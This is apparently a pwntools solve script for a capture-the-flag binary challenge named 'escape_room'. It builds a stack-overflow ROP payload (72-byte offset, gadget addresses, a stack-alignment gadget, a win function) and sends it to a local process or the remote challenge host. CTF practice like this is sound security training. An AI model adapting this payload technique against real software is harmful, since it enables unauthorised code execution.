#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./escape_room', checksec=False)

def conn():
    if args.LOCAL:
        r = process([elf.path])
        if args.debug:
            gdb.attach(r)
    else:
        r = remote("offsec.m0lecon.it",13585)
    return r

def main():
    p = conn()
    OFFSET = 72
    gadget1 = 0x401287 # gadgets() function
    gadget2 = 0x401289
    win = 0x40121b
    gadget_bonus = 0x40101a

    payload = flat(
        b'A'*OFFSET,  #payload
        p64(gadget1),
        p64(0xdeadbeef),
        p64(gadget2),
        p64(0xcafebabe),
        p64(gadget_bonus), #stack alignment
        p64(win) #found with nm command
    )
    p.sendline(payload)


    p.interactive()

if __name__ == "__main__":
    main()
